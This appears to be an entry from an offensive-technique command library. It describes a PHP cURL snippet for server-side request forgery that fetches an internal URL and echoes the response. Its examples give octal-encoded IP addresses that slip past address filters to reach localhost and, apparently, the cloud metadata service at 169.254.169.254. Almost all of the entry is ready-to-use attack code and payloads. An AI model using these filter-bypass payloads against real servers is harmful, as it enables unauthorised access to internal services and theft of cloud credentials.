---
data: >-
  $ch = curl_init($ip); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch, CURLOPT_HEADER, 0); $data = curl_exec($ch); curl_close($ch);
  echo $data;
tags:
  - ssrf
  - fetch
type: command
output: Response body from internal endpoint
executor: php
platforms:
  - PHP
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:53:38.228Z'
id: 35d1d5c0-b073-483d-98bd-23281fe9d8fb
verified: false
validated: true
submitted: true
---
# curl-fetch-internal-resource

## Command

```php
$ch = curl_init($ip);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, 0);
$data = curl_exec($ch);
curl_close($ch);
echo $data;
```

## Description

Initiates a cURL request to a validated IP or host after SSRF bypass, echoing the response to confirm access to internal resources.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `$ip` | Validated IP or host URL from prior validation | Yes |

## Examples

### Basic Usage

```php
$ip = 'http://0177.0.0.1/'; // Embed in script
```

### Advanced Usage

```php
$ip = 'http://0251.0376.0251.0376/'; // For metadata
```

## Expected Output

HTML or data from the internal endpoint, e.g., localhost page content.

## Related

- [[commands/throw-if-local-address-validation]]
